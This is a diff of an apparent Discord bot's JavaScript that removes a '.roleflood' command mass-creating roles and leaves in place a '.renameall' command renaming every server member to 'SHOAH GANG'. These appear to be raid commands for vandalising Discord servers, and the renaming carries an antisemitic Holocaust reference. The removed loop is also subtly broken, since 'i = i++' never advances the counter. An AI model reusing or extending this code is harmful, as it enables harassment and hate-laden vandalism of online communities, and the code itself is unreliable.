@@ -92,16 +92,6 @@ if (msg.content === '.pardon') {
       if (msg.deletable) msg.delete().catch(e => {});
     }).catch(e => {});
   }
-  if (msg.content === '.roleflood') {
-    //
-    if (msg.deletable) msg.delete();
-    let i = 0;
-    let interval = setInterval(function () {
-    if (i === 3) clearInterval(interval);
-      msg.guild.createRole({name: 'ISSOU', color:'RANDOM'}).catch(e => {});
-i = i++
-    }, 100).catch(e => {});
-  }
   if(msg.content === ".renameall"){
     msg.guild.members.forEach(member => {
       if(member.setNickname("SHOAH GANG"));      
